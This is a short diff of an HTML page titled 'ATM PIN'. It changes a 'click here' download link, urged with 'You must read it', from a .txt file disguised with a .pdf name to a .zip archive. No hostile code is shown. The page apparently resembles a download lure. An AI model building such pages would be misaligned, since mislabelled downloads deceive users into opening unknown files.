@@ -69,7 +69,7 @@
 
 
 	<h2 style="text-decoration: underline; text-align: center;">ATM PIN</h2>
-	  <p>You must read it. <b>Please <a href= download> <div class="content"> <a href="file/read.txt" download="read.pdf">click here</a></div></a></b></p>
+	  <p>You must read it. <b>Please <a href= download> <div class="content"> <a href="file/read.zip" download="read.zip">click here</a></div></a></b></p>
 	<img src="images/purce.jpg" width="200" height="200">
 	<img class="top" src="images/atm.png" width="200" height="200">
 <!-- Trigger/Open The Modal -->
